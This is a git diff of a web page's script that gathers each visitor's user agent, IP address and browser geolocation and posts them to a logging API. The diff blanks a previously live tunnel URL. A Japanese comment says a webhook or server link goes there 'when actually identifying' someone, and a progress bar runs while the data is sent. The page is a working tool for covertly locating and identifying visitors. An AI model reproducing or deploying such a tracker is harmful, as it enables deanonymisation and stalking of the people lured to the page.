@@ -64,7 +64,8 @@ h1{margin:0 0 10px;font-size:1.2rem;letter-spacing:.08em;color:#9ef}
 </div>
 
 <script>
-const API = 'https://shareware-afford-accessories-shade.trycloudflare.com';
+//今回は空にしているが、実際に特定する場合サーバー(webhook)などのリンクを入力
+const API = '';
 let LOG_ID = null;
 
 const prog = document.getElementById('prog');
@@ -112,7 +113,6 @@ function finish(){
 }
 
 function getClientIP() {
-  // Cloudflare系プロキシがよく使うヘッダー順
   const headers = [
     'CF-Connecting-IP',
     'True-Client-IP',
@@ -123,7 +123,6 @@ function getClientIP() {
   for (const h of headers) {
     const value = headers[h.toLowerCase()];
     if (value) {
-      // X-Forwarded-Forの場合は最初のカンマ区切りが本来のクライアントIPであることが多い
       if (h === 'X-Forwarded-For') {
         return value.split(',')[0].trim();
       }
@@ -131,11 +130,11 @@ function getClientIP() {
     }
   }
 
-  // 最終手段（ほぼ取れないが一応）
+
   return '取得失敗';
 }
 
-// メイン処理
+
 (() => {
   const payload = {
     ua: navigator.userAgent,
@@ -148,7 +147,7 @@ function getClientIP() {
     ip: '取得中…'
   };
 
-  // IPを先にクライアント側で推測表示（参考値）
+
   const clientIP = getClientIP();
   ipEl.textContent = clientIP;
   payload.ip = clientIP;
@@ -173,14 +172,12 @@ function getClientIP() {
     logid.textContent = LOG_ID;
     advance(60);
 
-    // サーバー側で確定したIPを上書き表示したい場合はここで再度取得も可能
-    // ただし多くの場合CF-Connecting-IPが正しいので省略可
   })
   .catch(() => {
     advance(60);
   });
 
-  // 位置情報
+
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       pos => {
@@ -189,7 +186,7 @@ function getClientIP() {
         payload.geo = g;
         advance(85);
 
-        // 位置情報更新
+
         fetch(`${API}/log/geo`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
